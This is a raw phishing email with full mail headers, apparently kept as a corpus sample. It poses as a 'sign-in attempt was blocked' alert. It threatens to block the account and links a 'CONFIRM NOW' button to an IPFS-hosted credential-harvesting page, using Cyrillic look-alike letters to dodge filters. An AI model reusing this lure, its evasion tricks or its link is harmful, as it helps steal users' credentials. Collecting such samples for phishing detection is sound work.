@@ -1,0 +1,103 @@
+From jose@monkey.org Sat Jul  1 09:10:04 2023 +0000
+Return-Path: clay@sexton-art.com
+Delivered-To: jose@monkey.org
+X-FDA: 80962471128.24.A6DF81E
+Received: from SFX.Sfxservers.com (sfx.sfxservers.com [50.184.145.212])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id DFD0160002
+	for <jose@monkey.org>; Sat,  1 Jul 2023 09:10:02 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf20.b.hostedemail.com: domain of clay@sexton-art.com designates 50.184.145.212 as permitted sender) smtp.mailfrom=clay@sexton-art.com;
+	dmarc=pass (policy=none) header.from=sexton-art.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1688202603;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=II4wWSiW/a4q/KkE36Lepl05j8ZtZ932wBMQkr7fxRY=;
+	b=OWt21rg7UzNZteW9LjtWYXN54mpHAoCMI/+uaqYvC6pfpDKnP0hkbgwO3GHGqXcMLZlVKu
+	RAGTBkHHcPwHHbWJKgVdxXWxRCnQc0ccFToT+4DwJFs0SZhmYIPB52++reyuRGYCJvctZP
+	1NGaRUn0qUJAooYaHe2njnykw5dp1r0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1688202603; a=rsa-sha256;
+	cv=none;
+	b=7FZHX91Vx9uyBkt5+8Kl3nYdeaaM1uyPWdahAaAB0A/7rDbjmSYOGM0m0nYpaB78fKvl9o
+	vj7C2q/fU4LKD/JqFuHIVzRF2PJwGkcA31CYrXVbMwwqAjSjNhoNA7YDMuovxBySoP52ue
+	Kwax4qxWiKHjFBcAjhRG86/mj3brtzw=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf20.b.hostedemail.com: domain of clay@sexton-art.com designates 50.184.145.212 as permitted sender) smtp.mailfrom=clay@sexton-art.com;
+	dmarc=pass (policy=none) header.from=sexton-art.com
+Received: from vm1409650.stark-industries.solutions ([138.124.184.65]) by Sfxservers.com with
+ MailEnable ESMTPSA (version=TLS1_2 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384); Fri, 30 Jun 2023 17:15:16 -0400
+From: monkey.org<clay@sexton-art.com>
+To: jose@monkey.org
+Subject: 1  Sign-in attempt was blocked
+Date: 30 Jun 2023 14:15:16 -0700
+Message-ID: <20230630141516.E5C81C0C19F53D6E@sexton-art.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-ME-Bayesian: 0.000000
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: DFD0160002
+X-Stat-Signature: xxcw6ef57fahted75cbkddssxswguyb6
+X-Rspam-User: 
+X-Spam-Status: No, score=1.51
+X-HE-Tag: 1688202602-271893
+X-HE-Meta: U2FsdGVkX1+YGlrjPL+s8iafJne9l1Qqi8lI/vyouOMOBBEEBbN3gBLIwcMmJ7JjgMAfRmCCUXx7r51NfQywTgaZ48evnYfTZHYiQ1gZTKuGMClj/zX1sOvORt5jiCVs4Kt+7co31849NCy+G/bI5ftfmPRC0LVxCnprvPbSGAtLg4w8mMZEBmgC+sKacw4exEr3EjmvA/0rOvyLoEykVs4g+P16LvR09CCkNqZiRd086tJB2H791vCnFfvU/4aGWiduHb48VIrdovlfKD0WahDDvUOWStEyghWI17GVPbCeGxFmcrv/dA==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 181
+
+<!DOCTYPE HTML>
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: "Times New Roman"; font-size: m=
+edium; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial;'>=
+Dear jose@monkey.org<br></span>
+<br style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; l=
+etter-spacing: normal; font-family: "Times New Roman"; font-size: medium; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
+; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps:=
+ normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
+; text-decoration-style: initial; text-decoration-color: initial;'>
+<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Times New Roman"; font-size: medium;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-cap=
+s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
+al; text-decoration-style: initial; text-decoration-color: initial;'>
+Someone just used your password to try to sign in to your account.jose@monk=
+ey.org</span>
+<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Times New Roman"; font-size: medium;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-cap=
+s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
+al; text-decoration-style: initial; text-decoration-color: initial;'>
+&nbsp;blocked them, but you should check what happened.<br>&nbsp;<table wid=
+th=3D"209" style=3D"text-indent: 0px;"><tbody><tr>
+<td style=3D'margin: 0px; border: 1px solid rgb(0, 120, 215); width: 163px;=
+ height: 30px; text-align: center; color: rgb(255, 255, 255); line-height: =
+20px; padding-right: 20px; padding-left: 20px; font-family: "Segoe UI Semib=
+old", "Segoe WP Semibold", "Segoe UI", "Segoe WP", Segoe, Tahoma, "Microsof=
+t Sans Serif", Verdana, sans-serif; font-size: 14px; vertical-align: middle=
+; background-color: rgb(0, 120, 215); text-wrap: nowrap;'>
+<a style=3D"color: rgb(255, 255, 255); text-decoration-line: none;" href=3D=
+"https://bafybeiam6cibeyemb7z2eeywmtps7zts7vn3f2sqgxpl2p73vjzqficiqe.ipfs.d=
+web.link/AutoMail.html#jose@monkey.org" target=3D"_blank" rel=3D"noopener n=
+oreferrer">&#1057;&#1054;NFIRM N&#1054;W</a></td></tr></tbody></table><p>Yo=
+ur account will be blocked on failure to carry out this above activity</p><=
+p>Email Service<br></p><hr><p></p><p><span style=3D"color: rgb(110, 120, 13=
+9);">
+Th&#1110;s &#1077;m&#1072;&#1110;l w&#1072;s s&#1077;nt t&#1086; jose@monke=
+y.org</span></p></span></body></html>
